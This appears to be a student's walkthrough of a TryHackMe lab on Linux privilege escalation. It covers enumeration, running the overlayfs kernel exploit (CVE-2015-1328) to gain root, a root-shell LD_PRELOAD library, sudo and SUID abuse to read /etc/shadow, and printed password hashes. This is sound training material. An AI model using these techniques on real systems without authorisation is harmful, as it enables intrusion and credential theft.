# Linux Privilege Escalation

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Walkthrough
Difficulty: Medium
Tags: Linux
Subscription type: Free
Description:
Learn the fundamentals of Linux privilege escalation. From enumeration to exploitation, get 
hands-on with over 8 different privilege escalation techniques.
```

Room link: [https://tryhackme.com/room/linprivesc](https://tryhackme.com/room/linprivesc)

## Solution

### Task 1: Introduction

Privilege escalation is a journey. There are no silver bullets, and much depends on the specific configuration of the target system. The kernel version, installed applications, supported programming languages, other users' passwords are a few key elements that will affect your road to the root shell.

This room was designed to cover the main privilege escalation vectors and give you a better understanding of the process. This new skill will be an essential part of your arsenal whether you are participating in CTFs, taking certification exams, or working as a penetration tester.

### Task 2: What is Privilege Escalation?

#### What does "privilege escalation" mean?

At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.

![PrivEsc Simple Visualization](Images/PrivEsc_Simple_Visualization.png)

#### Why is it important?

It's rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:

- Resetting passwords
- Bypassing access controls to compromise protected data
- Editing software configurations
- Enabling persistence
- Changing the privilege of existing (or new) users
- Execute any administrative command

---------------------------------------------------------------------------------------

### Task 3: Enumeration

**Note**: Launch the target machine attached to this task to follow along. You can launch the target machine and access it directly from your browser.

Alternatively, you can access it over SSH with the low-privilege user credentials below:

- Username: karen
- Password: Password1

Enumeration is the first step you have to take once you gain access to any system. You may have accessed the system by exploiting a critical vulnerability that resulted in root-level access or just found a way to send commands using a low privileged account. Penetration testing engagements, unlike CTF machines, don't end once you gain access to a specific system or user privilege level. As you will see, enumeration is as important during the post-compromise phase as it is before.

#### hostname

The `hostname` command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-3487340239), in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).

#### uname -a

Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.

#### /proc/version

The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.

Looking at `/proc/version` may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

#### /etc/issue

Systems can also be identified by looking at the `/etc/issue` file. This file usually contains some information about the operating system but can easily be customized or changed. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always good to look at all of these.

#### ps Command

The `ps` command is an effective way to see the running processes on a Linux system. Typing `ps` on your terminal will show processes for the current shell.

The output of the `ps` (Process Status) will show the following;

- PID: The process ID (unique to the process)
- TTY: Terminal type used by the user
- Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
- CMD: The command or executable running (will NOT display any command line parameter)

The “ps” command provides a few useful options.

- `ps -A`: View all running processes
- `ps axjf`: View process tree (see the tree formation until ps axjf is run below)

![ps process tree example](Images/ps_process_tree_example.png)

- `ps aux`: The `aux` option will show processes for all users (`a`), display the user that launched the process (`u`), and show processes that are not attached to a terminal (`x`). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.

#### env

The `env` command will show environmental variables.

![env Example](Images/env_Example.png)

The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.

#### sudo -l

The target system may be configured to allow users to run some (or all) commands with root privileges. The `sudo -l` command can be used to list all commands your user can run using `sudo`.

#### ls

One of the common commands used in Linux is probably `ls`.

While looking for potential privilege escalation vectors, please remember to always use the `ls` command with the `-la` parameter. The example below shows how the “.secret.txt” file can easily be missed using the `ls` or `ls -l` commands.

![ls Hidden File Example](Images/ls_Hidden_File_Example.png)

#### Id

The `id` command will provide a general overview of the user’s privilege level and group memberships.

It is worth remembering that the `id` command can also be used to obtain the same information for another user as seen below.

![id Example](Images/id_Example.png)

#### /etc/passwd

Reading the `/etc/passwd` file can be an easy way to discover users on the system.

![Etc Passwd Example 1](Images/Etc_Passwd_Example_1.png)

While the output can be long and a bit intimidating, it can easily be cut and converted to a useful list for brute-force attacks.

![Etc Passwd Example 2](Images/Etc_Passwd_Example_2.png)

Remember that this will return all users, some of which are system or service users that would not be very useful. Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory.

![Etc Passwd Example 3](Images/Etc_Passwd_Example_3.png)

#### history

Looking at earlier commands with the `history` command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.

#### ifconfig

The target system may be a pivoting point to another network. The `ifconfig` command will give us information about the network interfaces of the system. The example below shows the target system has three interfaces (eth0, tun0, and tun1). Our attacking machine can reach the eth0 interface but can not directly access the two other networks.

![ifconfig Example](Images/ifconfig_Example.png)

This can be confirmed using the `ip route` command to see which network routes exist.

![ip route Example](Images/ip_route_Example.png)

#### netstat

Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The `netstat` command can be used with several different options to gather information on existing connections.

- `netstat -a`: shows all listening ports and established connections.
- `netstat -at` or `netstat -au` can also be used to list TCP or UDP protocols respectively.
- `netstat -l`: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)

![netstat Example 1](Images/netstat_Example_1.png)

- `netstat -s`: list network usage statistics by protocol (below) This can also be used with the `-t` or `-u` options to limit the output to a specific protocol.

![netstat Example 2](Images/netstat_Example_2.png)

- `netstat -tp`: list connections with the service name and PID information.

![netstat Example 3](Images/netstat_Example_3.png)

This can also be used with the `-l` option to list listening ports (below)

![netstat Example 4](Images/netstat_Example_4.png)

We can see the “PID/Program name” column is empty as this process is owned by another user.

Below is the same command run with root privileges and reveals this information as 2641/nc (netcat)

![netstat Example 5](Images/netstat_Example_5.png)

- `netstat -i`: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.

![netstat Example 6](Images/netstat_Example_6.png)

The `netstat` usage you will probably see most often in blog posts, write-ups, and courses is `netstat -ano` which could be broken down as follows;

- `-a`: Display all sockets
- `-n`: Do not resolve names
- `-o`: Display timers

![netstat Example 7](Images/netstat_Example_7.png)

#### find Command

Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal.

Below are some useful examples for the “find” command.

Find files:

- `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
- `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
- `find / -type d -name config`: find the directory named config under “/”
- `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
- `find / -perm a=x`: find executable files
- `find /home -user frank`: find all files for user “frank” under “/home”
- `find / -mtime 10`: find files that were modified in the last 10 days
- `find / -atime 10`: find files that were accessed in the last 10 day
- `find / -cmin -60`: find files changed within the last hour (60 minutes)
- `find / -amin -60`: find files accesses within the last hour (60 minutes)
- `find / -size 50M`: find files with a 50 MB size

This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.

![find Example 1](Images/Find_Example_1.png)

The example above returns files that are larger than 100 MB. It is important to note that the “find” command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the `find` command with `-type f 2>/dev/null` to redirect errors to `/dev/null` and have a cleaner output (below).

![find Example 2](Images/Find_Example_2.png)

Folders and files that can be written to or executed from:

- `find / -writable -type d 2>/dev/null`: Find world-writeable folders
- `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
- `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders

The reason we see three different `find` commands that could potentially lead to the same result can be seen in the manual document. As you can see below, the perm parameter affects the way “find” works.

![find Example 3](Images/Find_Example_3.png)

- `find / -perm -o x -type d 2>/dev/null`: Find world-executable folders

Find development tools and supported languages:

- `find / -name perl*`
- `find / -name python*`
- `find / -name gcc*`

Find specific file permissions:

Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it. This allows for an interesting privilege escalation path,we will see in more details on task 6. The example below is given to complete the subject on the “find” command.

- `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.

#### General Linux Commands

As we are in the Linux realm, familiarity with Linux commands, in general, will be very useful. Please spend some time getting comfortable with commands such as `find`, `locate`, `grep`, `cut`, `sort`, etc.

---------------------------------------------------------------------------------------

#### What is the hostname of the target system?

```bash
$ hostname
wade7363
```

Answer: `wade7363`

#### What is the Linux kernel version of the target system?

```bash
$ uname -a
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
$ cat /proc/version
Linux version 3.13.0-24-generic (buildd@panlong) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014
```

Answer: `3.13.0-24-generic`

#### What Linux is this?

```bash
$ cat /etc/issue
Ubuntu 14.04 LTS \n \l
```

Answer: `Ubuntu 14.04 LTS`

#### What version of the Python language is installed on the system?

```bash
$ python -V
Python 2.7.6
```

Answer: `2.7.6`

#### What vulnerability seem to affect the kernel of the target system? (Enter a CVE number)

Google for `Linux kernel 3.13.0 CVE` and we find:

- [Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation](https://www.exploit-db.com/exploits/37292)

Answer: `CVE-2015-1328`

### Task 4: Automated Enumeration Tools

Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.

The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.

- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester)**: [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration**: [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker**: [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

---------------------------------------------------------------------------------------

### Task 5: Privilege Escalation: Kernel Exploits

**Note**: Launch the target machine attached to this task to follow along. You can launch the target machine and access it directly from your browser.

Alternatively, you can access it over SSH with the low-privilege user credentials below:

- **Username**: karen
- **Password**: Password1

Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.

Unless a single vulnerability leads to a root shell, the privilege escalation process will rely on misconfigurations and lax permissions.

The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.

The Kernel exploit methodology is simple;

1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploit

Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.

**Research sources**:

1. Based on your findings, you can use Google to search for an existing exploit code.
2. Sources such as [https://www.cvedetails.com/](https://www.cvedetails.com/) can also be useful.
3. Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).

**Hints/Notes**:

1. Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
2. Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
3. Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
4. You can transfer the exploit code from your machine to the target system using the `SimpleHTTPServer` Python module and `wget` respectively.

---------------------------------------------------------------------------------------

#### Find and use the appropriate kernel exploit to gain root privileges on the target system

From earlier we know that the machine is vulnerable for `CVE-2015-1328` and we have the following exploit to try out

- [Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation](https://www.exploit-db.com/exploits/37292)

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation]
└─$ searchsploit linux kernel 3.13.0
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation                                                                                                  | solaris/local/15962.c
Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation                                                                                                          | linux/local/50135.c
Linux Kernel 3.11 < 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_RCVBUFFORCE' Local Privilege Escalation                                                                                 | linux/local/41995.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                                                       | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)                                                  | linux/local/37293.txt
Linux Kernel 3.14-rc1 < 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Privilege Escalation                                                                             | linux_x86-64/local/33516.c
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X32=y' Local Privilege Escalation (3)                                                                     | linux_x86-64/local/31347.c
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.10) - 'CONFIG_X86_X32' Arbitrary Write (2)                                                                                            | linux/local/31346.c
Linux Kernel 3.4 < 3.13.2 - recvmmsg x32 compat (PoC)                                                                                                                      | linux/dos/31305.c
Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                                                                                                       | linux/dos/43234.c
Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                                                                                                                 | linux/local/41886.c
Linux Kernel < 3.16.1 - 'Remount FUSE' Local Privilege Escalation                                                                                                          | linux/local/34923.c
Linux Kernel < 3.16.39 (Debian 8 x64) - 'inotfiy' Local Privilege Escalation                                                                                               | linux_x86-64/local/44302.c
Linux Kernel < 4.10.13 - 'keyctl_set_reqkey_keyring' Local Denial of Service                                                                                               | linux/dos/42136.c
Linux kernel < 4.10.15 - Race Condition Privilege Escalation                                                                                                               | linux/local/43345.c
Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege Escalation                                                                                          | linux/local/45553.c
Linux Kernel < 4.13.1 - BlueTooth Buffer Overflow (PoC)                                                                                                                    | linux/dos/42762.txt
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                                                              | linux/local/45010.c
Linux Kernel < 4.14.rc3 - Local Denial of Service                                                                                                                          | linux/dos/42932.c
Linux Kernel < 4.15.4 - 'show_floppy' KASLR Address Leak                                                                                                                   | linux/local/44325.c
Linux Kernel < 4.16.11 - 'ext4_read_inline_data()' Memory Corruption                                                                                                       | linux/dos/44832.txt
Linux Kernel < 4.17-rc1 - 'AF_LLC' Double Free                                                                                                                             | linux/dos/44579.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                                                                     | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                                                          | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                                                      | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)                                                  | linux/local/47169.c
Linux Kernel < 4.5.1 - Off-By-One (PoC)                                                                                                                                    | linux/dos/44301.c
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation]
└─$ searchsploit -m 37292           
  Exploit: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/37292
     Path: /usr/share/exploitdb/exploits/linux/local/37292.c
    Codes: CVE-2015-1328
 Verified: True
File Type: C source, ASCII text, with very long lines (466)
Copied to: /mnt/hgfs/Wargames/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation/37292.c
```

We start a web server to share the exploit

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation]
└─$ ls
37292.c

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_Privilege_Escalation]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

and download it to the target machine

```bash
$ cd /tmp
$ wget http://192.168.187.183/37292.c
--2025-12-18 03:04:05--  http://192.168.187.183/37292.c
Connecting to 192.168.187.183:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4968 (4.9K) [text/x-csrc]
Saving to: ‘37292.c’

100%[=============================================================================>] 4,968       --.-K/s   in 0s      

2025-12-18 03:04:05 (717 MB/s) - ‘37292.c’ saved [4968/4968]
```

Next, we compile and run the exploit

```bash
$ gcc 37292.c -o ofs
$ id
uid=1001(karen) gid=1001(karen) groups=1001(karen)
$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(karen)
# 
```

We are now running as root!

#### What is the content of the flag1.txt file?

Time to hunt for the flag:

```bash
# find / -name flag1.txt 
/home/matt/flag1.txt
# cat /home/matt/flag1.txt
THM-<REDACTED>
# 
```

Answer: `THM-<REDACTED>`

### Task 6: Privilege Escalation: Sudo

**Note**: Launch the target machine attached to this task to follow along. You can launch the target machine and access it directly from your browser.

Alternatively, you can access it over SSH with the low-privilege user credentials below:

- **Username**: karen
- **Password**: Password1

The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.

Any user can check its current situation related to root privileges using the `sudo -l` command.

[https://gtfobins.github.io/](https://gtfobins.github.io/) is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.

#### Leverage application functions

Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.

In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (`-f`: specify an alternate ServerConfigFile).

![Apache2 Help](Images/Apache2_Help.png)

Loading the `/etc/shadow` file using this option will result in an error message that includes the first line of the `/etc/shadow` file.

#### Leverage LD_PRELOAD

On some systems, you may see the LD_PRELOAD environment option.

![Sudo with LD_PRELOAD](Images/Sudo_with_LD_PRELOAD.png)

LD_PRELOAD is a function that allows any program to use shared libraries. This blog post will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.

The steps of this privilege escalation vector can be summarized as follows;

1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

![Compiling LD_PRELOAD Exploit](Images/Compiling_LD_PRELOAD_Exploit.png)

We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD_PRELOAD option, as follows;

`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`

This will result in a shell spawn with root privileges.

![Running LD_PRELOAD Exploit](Images/Running_LD_PRELOAD_Exploit.png)

---------------------------------------------------------------------------------------

#### How many programs can the user "karen" run on the target system with sudo rights?

```bash
$ sudo -l
Matching Defaults entries for karen on ip-10-64-190-165:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-64-190-165:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
$ 
```

Answer: `3`

#### What is the content of the flag2.txt file?

Let's use `sudo` together with `find` to get the flag

```bash
$ sudo find -name flag2.txt -exec cat {} \;
THM-<REDACTED>
$ 
```

Answer: `THM-<REDACTED>`

#### How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?

From [https://gtfobins.github.io/gtfobins/nmap/#suid](https://gtfobins.github.io/gtfobins/nmap/#suid):

Answer: `sudo nmap --interactive`

#### What is the hash of frank's password?

We can use `sudo` and `find` once again...

```bash
$ sudo find /etc/shadow -exec grep frank {} \;
frank:$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1:18796:0:99999:7:::
$ 
```

Answer: `$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1:18796`

### Task 7: Privilege Escalation: SUID

**Note**: Launch the target machine attached to this task to follow along. You can launch the target machine and access it directly from your browser.

Alternatively, you can access it over SSH with the low-privilege user credentials below:

- **Username**: karen
- **Password**: Password1

Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.

You will notice these files have an “s” bit set showing their special permission level.

`find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set.

![SUID Searching with find](Images/SUID_Searching_with_find.png)

A good practice would be to compare executables on this list with GTFOBins ([https://gtfobins.github.io](https://gtfobins.github.io)). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list `https://gtfobins.github.io/#+suid`).

The list above shows that nano has the SUID bit set. Unfortunately, GTFObins does not provide us with an easy win. Typical to real-life privilege escalation scenarios, we will need to find intermediate steps that will help us leverage whatever minuscule finding we have.

![GTFObins SUID Example](Images/GTFObins_SUID_Example.png)

**Note**: The attached VM has another binary with SUID other than `nano`.

The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. At this stage, we have two basic options for privilege escalation: reading the `/etc/shadow` file or adding our user to `/etc/passwd`.

Below are simple steps using both vectors.

#### Reading the /etc/shadow file

We see that the `nano` text editor has the SUID bit set by running the `find / -type f -perm -04000 -ls 2>/dev/null` command.

`nano /etc/shadow` will print the contents of the `/etc/shadow` file. We can now use the `unshadow` tool to create a file crackable by John the Ripper. To achieve this, `unshadow` needs both the `/etc/shadow` and `/etc/passwd` files.

![JtR Unshadow Example 1](Images/JtR_Unshadow_Example_1.png)

The unshadow tool’s usage can be seen below;  
`unshadow passwd.txt shadow.txt > passwords.txt`

![JtR Unshadow Example 2](Images/JtR_Unshadow_Example_2.png)

With the correct wordlist and a little luck, John the Ripper can return one or several passwords in cleartext. For a more detailed room on John the Ripper, you can visit [https://tryhackme.com/room/johntheripperbasics](https://tryhackme.com/room/johntheripperbasics).

#### Adding our user to /etc/passwd

The other option would be to add a new user that has root privileges. This would help us circumvent the tedious process of password cracking. Below is an easy way to do it:

We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.

![Openssl Passwd Example](Images/Openssl_Passwd_Example.png)

We will then add this password with a username to the `/etc/passwd` file.

![Modifying Etc Passwd](Images/Modifying_Etc_Passwd.png)

Once our user is added (please note how `root:/bin/bash` was used to provide a root shell) we will need to switch to this user and hopefully should have root privileges.

![Su to new user](Images/Su_to_new_user.png)

Now it's your turn to use the skills you were just taught to find a vulnerable binary.

---------------------------------------------------------------------------------------

#### Which user shares the name of a great comic book writer?

```bash
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
gerryconway:x:1001:1001::/home/gerryconway:/bin/sh
user2:x:1002:1002::/home/user2:/bin/sh
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
karen:x:1003:1003::/home/karen:/bin/sh
$ 
```

The answer ought to be [Gerry Conway](https://en.wikipedia.org/wiki/Gerry_Conway).

We also create a local copy of this file names `passwd.txt`.

Answer: `gerryconway`

#### What is the password of user2?

First we check for SUID-programs that can be used to read the `/etc/shadow` file.

```bash
$ find / -type f -perm /4000 2>/dev/null
/snap/core/10185/bin/mount
/snap/core/10185/bin/ping
/snap/core/10185/bin/ping6
/snap/core/10185/bin/su
/snap/core/10185/bin/umount
/snap/core/10185/usr/bin/chfn
/snap/core/10185/usr/bin/chsh
/snap/core/10185/usr/bin/gpasswd
/snap/core/10185/usr/bin/newgrp
/snap/core/10185/usr/bin/passwd
/snap/core/10185/usr/bin/sudo
/snap/core/10185/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/10185/usr/lib/openssh/ssh-keysign
/snap/core/10185/usr/lib/snapd/snap-confine
/snap/core/10185/usr/sbin/pppd
/snap/core18/1885/bin/mount
/snap/core18/1885/bin/ping
/snap/core18/1885/bin/su
/snap/core18/1885/bin/umount
/snap/core18/1885/usr/bin/chfn
/snap/core18/1885/usr/bin/chsh
/snap/core18/1885/usr/bin/gpasswd
/snap/core18/1885/usr/bin/newgrp
/snap/core18/1885/usr/bin/passwd
/snap/core18/1885/usr/bin/sudo
/snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1885/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/umount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/base64
/usr/bin/su
/usr/bin/fusermount
/usr/bin/at
/usr/bin/mount
$ 
```

`base64` seems like a good choice.

```bash
$ base64 /etc/shadow | base64 -d
root:*:18561:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
